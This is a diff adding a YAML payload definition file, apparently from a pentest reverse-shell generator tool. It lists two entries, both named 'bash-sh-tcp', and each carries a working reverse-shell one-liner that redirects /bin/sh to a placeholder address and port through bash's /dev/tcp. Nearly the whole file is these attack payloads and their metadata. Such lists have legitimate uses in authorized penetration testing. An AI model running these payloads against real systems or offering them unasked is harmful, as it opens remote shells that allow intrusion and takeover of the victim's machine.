@@ -1,0 +1,64 @@
+---
+
+###
+### Meta definitions
+###
+specification:
+  payload: cmd
+  type: revshell
+  version: 0.0.1
+
+
+###
+### Items
+###
+items:
+
+  - name: bash-sh-tcp
+    desc: TCP reverse shell with bash|sh|zsh initiated from within a bash shell
+    info:
+      - Can be executed from within any shell
+    rating: 1
+    meta:
+      author: cytopia
+      editors: ["cytopia"]
+      created: "2021-04-08"
+      modified: "2021-04-08"
+      version: 0.0.1
+    cmd:
+      executable: bash
+      requires:
+        commands: ["sh", "bash"]
+        shell_env: ["bash", "csh", "dash", "ksh", "sh", "tcsh", "zsh"]
+        os: ["bsd", "linux", "mac", "solaris"]
+    revshell:
+      proto: tcp
+      shell: sh
+      command: /bin/sh
+    payload: |
+      bash -c '/bin/sh>&/dev/tcp/__ADDR__/__PORT__ 0>&1'
+
+
+  - name: bash-sh-tcp
+    desc: TCP reverse shell with bash|sh|zsh initiated from within a bash shell
+    info:
+      - Must be executed from within a bash shell ('/dev/tcp/' is bash specific)
+    rating: 1
+    meta:
+      author: cytopia
+      editors: ["cytopia"]
+      created: "2021-04-08"
+      modified: "2021-04-08"
+      version: 0.0.1
+    cmd:
+      executable: sh
+      requires:
+        commands: ["sh"]
+        shell_env: ["bash"]
+        os: ["bsd", "linux", "mac", "solaris"]
+    revshell:
+      proto: tcp
+      shell: sh
+      command: /bin/sh
+    payload: |
+      /bin/sh>&/dev/tcp/__ADDR__/__PORT__ 0>&1
